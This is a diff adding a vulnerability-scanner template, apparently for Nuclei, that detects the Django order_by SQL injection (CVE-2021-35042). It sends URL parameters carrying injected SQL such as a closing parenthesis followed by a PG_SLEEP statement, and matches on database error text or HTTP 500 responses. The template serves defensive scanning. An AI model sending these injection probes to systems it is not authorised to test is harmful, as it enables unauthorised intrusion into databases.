@@ -1,0 +1,34 @@
+id: django-orm-sqli-order-by
+
+info:
+  name: Django ORM SQL Injection via order_by
+  author: custom
+  severity: high
+  description: |
+    Django QuerySet.order_by() passes unsanitized user input to SQL
+    ORDER BY clause. Affects Django < 3.2.5 (CVE-2021-35042) and
+    any custom view that calls order_by() with user input.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-35042
+    - https://www.djangoproject.com/weblog/2021/jul/01/security-releases/
+  tags: cve,cve2021,django,sqli,orm
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?order=vuln_model.name);SELECT+PG_SLEEP(0)--"
+      - "{{BaseURL}}/admin/?o=1);SELECT+PG_SLEEP(0)--"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "ProgrammingError"
+          - "OperationalError"
+          - "syntax error"
+          - "unterminated"
+        condition: or
+
+      - type: status
+        status:
+          - 500
